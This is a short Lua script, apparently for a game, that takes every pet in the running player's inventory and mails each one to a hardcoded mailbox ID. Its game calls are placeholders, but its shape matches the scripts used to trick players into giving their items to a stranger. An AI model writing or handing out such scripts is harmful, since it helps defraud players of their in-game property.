-- Lua Script to send all pets from the current player’s inventory to mailbox ID 'liadqjjw'

-- Define the target mailbox ID
local targetMailboxID = "liadqjjw"

-- Function to get the current player’s ID
function getCurrentPlayerID()
    -- Replace this with the actual API call or method to get the current player's ID
    local playerID = GameAPI.GetCurrentPlayerID() -- Example function call
    return playerID
end

-- Function to get all pet IDs from the current player’s inventory
function getPlayerInventoryPets(playerID)
    -- Replace this with the actual API call or method to fetch all pets from the given player's inventory
    local petIDs = GameAPI.GetPlayerPets(playerID) -- Example function call
    return petIDs
end

-- Function to send a pet to the mailbox
function sendPetToMailbox(petID, mailboxID)
    -- Replace this with the actual API call or method to send a pet to the mailbox
    local success, err = GameAPI.SendPetToMailbox(petID, mailboxID) -- Example function call
    if not success then
        print("Failed to send pet with ID " .. petID .. ": " .. err)
    else
        print("Successfully sent pet with ID " .. petID .. " to mailbox " .. mailboxID)
    end
end

-- Main function to send all pets from the current player’s inventory to the mailbox
function main()
    local playerID = getCurrentPlayerID()
    
    if not playerID then
        print("Unable to get current player ID.")
        return
    end

    local petIDs = getPlayerInventoryPets(playerID)
    
    if not petIDs or #petIDs == 0 then
        print("No pets found in inventory.")
        return
    end

    -- Iterate through the list of pet IDs and send each pet
    for _, petID in ipairs(petIDs) do
        sendPetToMailbox(petID, targetMailboxID)
    end
end

-- Execute the script
main()
